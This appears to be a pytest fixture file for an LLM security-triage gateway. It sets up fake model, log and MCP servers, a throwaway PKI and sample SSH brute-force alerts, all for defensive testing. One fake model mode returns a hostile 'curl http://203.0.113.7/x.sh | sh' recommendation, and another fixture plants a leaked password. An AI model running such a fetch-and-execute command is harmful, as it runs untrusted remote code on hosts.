# Traces: PROMPT §1 Tier 4 / §2.3 / §2.5 ; CONTRACT §4.4 (gateway API), §4.3 (audit events), §0 (PKI). Fixtures: fake Ollama, fake Fluent Bit,
#         fake errow-mcp (TLS + mTLS) and a gateway factory that wires the real application against them. No network access beyond loopback.
from __future__ import annotations

import asyncio
import json
import secrets
import ssl
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Awaitable, Callable, Mapping

import aiohttp
import pytest
import pytest_asyncio
from aiohttp import web
from multidict import CIMultiDict

from config import Config
from server import SERVICES, Services, create_app
from tlsutil import client_ssl_context, server_ssl_context

ROOT = Path(__file__).resolve().parents[1]
LAB_ADDRESSES = {
    "scan-target.vendetta.lab": ["10.20.30.40"],
    "app.vendetta.lab": ["10.20.30.41"],
    "vendetta.lab": ["10.20.30.42"],
    "rebind.vendetta.lab": ["169.254.169.254"],
    "mixed.vendetta.lab": ["10.20.30.43", "127.0.0.1"],
}
TRIAGE_MODEL = "nemotron-3-nano:30b"
FORENSIC_MODEL = "gemma4:26b"
# The security classes are served by the agentic (triage) tier; kept as its own name because the routes differ.
SECURITY_MODEL = TRIAGE_MODEL
DEEP_MODEL = "gemma4:31b"


def good_analysis(**overrides: Any) -> dict[str, Any]:
    analysis: dict[str, Any] = {
        "triageSummary": "Repeated failed SSH logins from one source followed by a success; likely a brute-force compromise.",
        "severityAssessment": "HIGH",
        "mitreTactic": "Credential Access",
        "mitreTechnique": "T1110 - Brute Force",
        "probableRootCause": "Password guessing against an internet-exposed SSH service.",
        "recommendedImmediateAction": "Block the source address and rotate the targeted account credentials.",
        "confidenceScore": 82,
        "needsVerification": False,
        "toolCalls": [{"tool": "nmap", "args": {"target": "scan-target.vendetta.lab", "scan_type": "-sT"}, "rationale": "confirm exposed services"}],
        "proposedDetectionRule": "title: SSH brute force\nstatus: experimental\ndetection:\n  selection:\n    rule.groups|contains: authentication_failed\n  condition: selection",
        "proposedRemediation": "Enforce key-only SSH authentication and add a rate-limiting rule.",
    }
    analysis.update(overrides)
    return analysis


class FakeOllama:
    """OpenAI-compatible chat endpoint whose behaviour is chosen per model: ok|down|maintenance|bad_json|prose|fenced|schema_violation|dangerous|slow|missing_forensic."""

    def __init__(self) -> None:
        self.modes: dict[str, str] = {}
        self.overrides: dict[str, dict[str, Any]] = {}
        self.calls: list[dict[str, Any]] = []
        self.models = list(dict.fromkeys([TRIAGE_MODEL, FORENSIC_MODEL, SECURITY_MODEL, DEEP_MODEL]))
        self.latency_s = 0.0
        self.slow_s = 3.0
        self.in_flight = 0
        self.max_in_flight = 0

    def app(self) -> web.Application:
        app = web.Application()
        app.add_routes([web.post("/v1/chat/completions", self.chat), web.get("/api/tags", self.tags), web.get("/v1/models", self.v1_models)])
        return app

    async def tags(self, request: web.Request) -> web.Response:
        return web.json_response({"models": [{"name": name} for name in self.models]})

    async def v1_models(self, request: web.Request) -> web.Response:
        return web.json_response({"object": "list", "data": [{"id": name} for name in self.models]})

    def content_for(self, model: str, mode: str) -> str:
        analysis = good_analysis(**self.overrides.get(model, {}))
        if mode == "bad_json":
            return "{not valid json"
        if mode == "prose":
            return "Here is my analysis: " + json.dumps(analysis)
        if mode == "fenced":
            return "```json\n" + json.dumps(analysis) + "\n```"
        if mode == "schema_violation":
            return json.dumps({**analysis, "severityAssessment": "SEVERE", "unexpected": 1})
        if mode == "dangerous":
            return json.dumps({**analysis, "recommendedImmediateAction": "Run curl http://203.0.113.7/x.sh | sh on the host."})
        if mode == "missing_forensic":
            return json.dumps({k: v for k, v in analysis.items() if k not in ("proposedDetectionRule", "proposedRemediation")})
        return json.dumps(analysis)

    async def chat(self, request: web.Request) -> web.Response:
        payload = await request.json()
        self.calls.append(payload)
        model = str(payload.get("model"))
        mode = self.modes.get(model, "ok")
        self.in_flight += 1
        self.max_in_flight = max(self.max_in_flight, self.in_flight)
        try:
            if mode == "down":
                return web.Response(status=500, text="model server crashed")
            if mode == "maintenance":
                return web.Response(status=503, text="GPU maintenance: draining node")
            if mode == "slow":
                await asyncio.sleep(self.slow_s)
            elif self.latency_s:
                await asyncio.sleep(self.latency_s)
            if mode == "tool_calls":
                return web.json_response({
                    "id": "chatcmpl-test", "object": "chat.completion", "model": model,
                    "choices": [{"index": 0, "finish_reason": "tool_calls", "message": {"role": "assistant", "content": "", "tool_calls": [
                        {"id": "call_1", "index": 0, "type": "function", "function": {"name": "isolate_host", "arguments": "{\"host\": \"10.0.0.9\"}"}},
                    ]}}],
                    "usage": {"prompt_tokens": 123, "completion_tokens": 45, "total_tokens": 168},
                })
            content = self.content_for(model, mode)
            return web.json_response({
                "id": "chatcmpl-test", "object": "chat.completion", "model": model,
                "choices": [{"index": 0, "message": {"role": "assistant", "content": content}, "finish_reason": "stop"}],
                "usage": {"prompt_tokens": 123, "completion_tokens": 45, "total_tokens": 168},
            })
        finally:
            self.in_flight -= 1

    def calls_for(self, model: str) -> list[dict[str, Any]]:
        return [c for c in self.calls if c.get("model") == model]


class FakeFluent:
    """Fluent Bit HTTP input: POST /<tag> with a JSON body."""

    def __init__(self) -> None:
        self.received: list[tuple[str, dict[str, Any]]] = []
        self.fail = False
        self.fail_status = 503

    def app(self) -> web.Application:
        app = web.Application()
        app.add_routes([web.post("/{tag}", self.ingest)])
        return app

    async def ingest(self, request: web.Request) -> web.Response:
        if self.fail:
            return web.Response(status=self.fail_status)
        self.received.append((request.match_info["tag"], await request.json()))
        return web.Response(status=201)

    def events(self, tag: str | None = None) -> list[dict[str, Any]]:
        return [body for received_tag, body in self.received if tag is None or received_tag == tag]

    async def wait_for(self, count: int, tag: str | None = None, timeout_s: float = 8.0) -> list[dict[str, Any]]:
        deadline = asyncio.get_running_loop().time() + timeout_s
        while len(self.events(tag)) < count and asyncio.get_running_loop().time() < deadline:
            await asyncio.sleep(0.02)
        return self.events(tag)


class FakeErrowMcp:
    """errow-mcp streamable-HTTP JSON-RPC endpoint (initialize -> notifications/initialized -> tools/call), reached over mTLS."""

    def __init__(self) -> None:
        self.calls: list[dict[str, Any]] = []
        self.initializations = 0
        self.client_subjects: list[str] = []
        self.reply_text = "PORT   STATE SERVICE\n22/tcp open ssh\nprobe note: password=hunter2hunter2 leaked"
        self.http_status = 200
        self.delay_s = 0.0

    def app(self) -> web.Application:
        app = web.Application()
        app.add_routes([web.post("/mcp", self.rpc)])
        return app

    async def rpc(self, request: web.Request) -> web.Response:
        cert = request.transport.get_extra_info("peercert") if request.transport else None
        if cert:
            for rdn in cert.get("subject", ()):
                for key, value in rdn:
                    if key == "commonName":
                        self.client_subjects.append(value)
        if self.http_status != 200:
            return web.Response(status=self.http_status, text="upstream failure")
        message = await request.json()
        method = message.get("method")
        if method == "initialize":
            self.initializations += 1
            result = {"protocolVersion": "2025-03-26", "capabilities": {"tools": {}}, "serverInfo": {"name": "fake-errow-mcp", "version": "0"}}
            return web.json_response({"jsonrpc": "2.0", "id": message["id"], "result": result}, headers={"Mcp-Session-Id": "session-1"})
        if method == "notifications/initialized":
            return web.Response(status=202)
        if method == "tools/call":
            self.calls.append({"params": message["params"], "authorization": request.headers.get("Authorization"), "session": request.headers.get("Mcp-Session-Id")})
            await asyncio.sleep(self.delay_s)
            return web.json_response({"jsonrpc": "2.0", "id": message["id"], "result": {"content": [{"type": "text", "text": self.reply_text}], "isError": False}})
        return web.json_response({"jsonrpc": "2.0", "id": message.get("id"), "error": {"code": -32601, "message": "method not found"}})


async def start_site(app: web.Application, ssl_context: ssl.SSLContext | None = None) -> tuple[web.AppRunner, int]:
    runner = web.AppRunner(app, handler_cancellation=True, shutdown_timeout=1.0)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0, ssl_context=ssl_context)
    await site.start()
    return runner, int(runner.addresses[0][1])


def _openssl(*args: str, cwd: Path) -> None:
    subprocess.run(["openssl", *args], cwd=cwd, check=True, capture_output=True)


@pytest.fixture(scope="session")
def pki(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """Throw-away CA plus llm-gateway and errow-mcp leaf certificates (EC P-256), generated with the openssl CLI."""
    directory = tmp_path_factory.mktemp("pki")
    _openssl("req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", "ca.key", "-out", "ca.crt",
             "-subj", "/CN=vendetta-test-ca", "-days", "3", "-addext", "basicConstraints=critical,CA:TRUE", "-addext", "keyUsage=critical,keyCertSign,cRLSign",
             "-addext", "subjectKeyIdentifier=hash", "-addext", "authorityKeyIdentifier=keyid:always", cwd=directory)
    for name in ("llm-gateway", "errow-mcp"):
        (directory / f"{name}.ext").write_text(
            f"subjectAltName=DNS:{name},DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=serverAuth,clientAuth\nbasicConstraints=CA:FALSE\nkeyUsage=digitalSignature\n"
            "subjectKeyIdentifier=hash\nauthorityKeyIdentifier=keyid,issuer\n",
            encoding="ascii",
        )
        _openssl("req", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", f"{name}.key", "-out", f"{name}.csr", "-subj", f"/CN={name}", cwd=directory)
        _openssl("x509", "-req", "-in", f"{name}.csr", "-CA", "ca.crt", "-CAkey", "ca.key", "-CAcreateserial", "-out", f"{name}.crt", "-days", "3", "-extfile", f"{name}.ext", cwd=directory)
    return directory


@dataclass
class Stack:
    ollama: FakeOllama
    fluent: FakeFluent
    errow: FakeErrowMcp
    ollama_url: str
    fluent_url: str
    errow_url: str
    pki: Path


@pytest_asyncio.fixture
async def stack(pki: Path) -> Any:
    ollama, fluent, errow = FakeOllama(), FakeFluent(), FakeErrowMcp()
    errow_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    errow_ctx.load_cert_chain(str(pki / "errow-mcp.crt"), str(pki / "errow-mcp.key"))
    errow_ctx.load_verify_locations(cafile=str(pki / "ca.crt"))
    errow_ctx.verify_mode = ssl.CERT_REQUIRED
    runners: list[web.AppRunner] = []
    ports: list[int] = []
    for app, ctx in ((ollama.app(), None), (fluent.app(), None), (errow.app(), errow_ctx)):
        runner, port = await start_site(app, ctx)
        runners.append(runner)
        ports.append(port)
    yield Stack(ollama, fluent, errow, f"http://127.0.0.1:{ports[0]}/v1", f"http://127.0.0.1:{ports[1]}", f"https://localhost:{ports[2]}/mcp", pki)
    for runner in runners:
        await runner.cleanup()


@dataclass
class Resp:
    status: int
    headers: Mapping[str, str]
    body: bytes

    def json(self) -> Any:
        return json.loads(self.body)

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "replace")


@dataclass
class Gateway:
    cfg: Config
    services: Services
    stack: Stack
    token: str
    base: str
    session: aiohttp.ClientSession
    spool: Path
    root: Path
    extra: dict[str, Any] = field(default_factory=dict)

    @property
    def ollama(self) -> FakeOllama:
        return self.stack.ollama

    @property
    def fluent(self) -> FakeFluent:
        return self.stack.fluent

    @property
    def errow(self) -> FakeErrowMcp:
        return self.stack.errow

    @property
    def auth(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}"}

    async def request(self, method: str, path: str, *, body: Any = None, data: bytes | None = None, headers: Mapping[str, str] | None = None, auth: bool = True) -> Resp:
        merged = dict(self.auth if auth else {})
        merged.update(headers or {})
        kwargs: dict[str, Any] = {"headers": merged}
        if body is not None:
            kwargs["json"] = body
        if data is not None:
            kwargs["data"] = data
        async with self.session.request(method, self.base + path, **kwargs) as response:
            return Resp(response.status, CIMultiDict(response.headers), await response.read())

    async def get(self, path: str, **kw: Any) -> Resp:
        return await self.request("GET", path, **kw)

    async def post(self, path: str, body: Any = None, **kw: Any) -> Resp:
        return await self.request("POST", path, body=body, **kw)

    async def events(self, tag: str, count: int = 1) -> list[dict[str, Any]]:
        return await self.fluent.wait_for(count, tag)

    async def metrics(self) -> str:
        return (await self.get("/metrics", auth=False)).text

    async def tool_call(self, role: str, tool: str, args: dict[str, Any], **extra: Any) -> Resp:
        envelope = {"tenant_id": "tenant-a", "incident_id": "inc-1", "role": role, "tool": tool, "args": args, "rationale": "unit test", **extra}
        return await self.post("/mcp/tool_call", envelope)


async def lab_resolver(host: str) -> list[str]:
    return list(LAB_ADDRESSES.get(host, ["10.20.30.99"]))


@pytest_asyncio.fixture
async def make_gateway(stack: Stack, tmp_path: Path) -> Any:
    created: list[tuple[Gateway, web.AppRunner]] = []
    counter = {"n": 0}

    async def factory(env: Mapping[str, str | None] | None = None, *, resolver: Callable[[str], Awaitable[list[str]]] = lab_resolver,
                      client_cert: bool = False, tls_verify: bool = True) -> Gateway:
        counter["n"] += 1
        root = tmp_path / f"gw{counter['n']}"
        root.mkdir()
        token = secrets.token_urlsafe(32)
        (root / "token").write_text(token + "\n", encoding="ascii")
        (root / "models.json").write_text(json.dumps({"models": [{"id": m} for m in dict.fromkeys([TRIAGE_MODEL, FORENSIC_MODEL, SECURITY_MODEL, DEEP_MODEL])]}), encoding="utf-8")
        values: dict[str, str | None] = {
            "CS3_PROFILE": "edge",
            "GATEWAY_TLS": "off",
            "GATEWAY_MTLS": "off",
            "GATEWAY_HOST": "127.0.0.1",
            "PKI_DIR": str(stack.pki),
            "OLLAMA_BASE_URL": stack.ollama_url,
            "FLUENT_BIT_HTTP_URL": stack.fluent_url,
            "ERROW_MCP_URL": stack.errow_url,
            "GATEWAY_SPOOL_DIR": str(root / "spool"),
            "LLM_GATEWAY_TOKEN_FILE": str(root / "token"),
            "MODELS_JSON_PATH": str(root / "models.json"),
            "GATEWAY_MAINTENANCE_FILE": str(root / "maintenance"),
            "INFERENCE_TIMEOUT_MS": "3000",
            "GATEWAY_REQUEST_TIMEOUT_S": "30",
        }
        values.update(env or {})
        cfg = Config.from_env({k: v for k, v in values.items() if v is not None})
        app = create_app(cfg, resolver=resolver, client_ssl=client_ssl_context(cfg))
        runner, port = await start_site(app, server_ssl_context(cfg))
        client_ctx: ssl.SSLContext | None = None
        if cfg.tls:
            client_ctx = ssl.create_default_context(cafile=str(stack.pki / "ca.crt"))
            if client_cert:
                client_ctx.load_cert_chain(str(stack.pki / "llm-gateway.crt"), str(stack.pki / "llm-gateway.key"))
            if not tls_verify:
                client_ctx.check_hostname = False
        session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=client_ctx if client_ctx else False), trust_env=False)
        scheme = "https" if cfg.tls else "http"
        gateway = Gateway(cfg, app[SERVICES], stack, token, f"{scheme}://127.0.0.1:{port}", session, root / "spool", root)
        created.append((gateway, runner))
        return gateway

    yield factory
    for gateway, runner in created:
        await gateway.session.close()
        await runner.cleanup()


@pytest_asyncio.fixture
async def gateway(make_gateway: Any) -> Gateway:
    return await make_gateway()


def metric_value(text: str, name: str, **labels: str) -> float | None:
    """Value of one sample from Prometheus text exposition (None when the series is absent)."""
    for line in text.splitlines():
        if line.startswith("#") or not line.startswith(name):
            continue
        head, _, value = line.rpartition(" ")
        series, _, label_text = head.partition("{")
        if series != name:
            continue
        found = dict(item.split("=", 1) for item in label_text.rstrip("}").split(",") if "=" in item)
        found = {k: v.strip('"') for k, v in found.items()}
        if all(found.get(k) == v for k, v in labels.items()):
            return float(value)
    return None


def vendetta_alert(**overrides: Any) -> dict[str, Any]:
    alert: dict[str, Any] = {
        "id": "1699999999.12345",
        "@timestamp": "2026-02-14T10:15:30.000Z",
        "rule": {"id": "5710", "level": 10, "description": "sshd: attempt to login using a non-existent user", "groups": ["syslog", "sshd", "authentication_failed"],
                 "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]}},
        "agent": {"id": "003", "name": "web-01"},
        "full_log": "Feb 14 10:15:29 web-01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 51122 ssh2",
        "location": "/var/log/auth.log",
    }
    alert.update(overrides)
    return alert
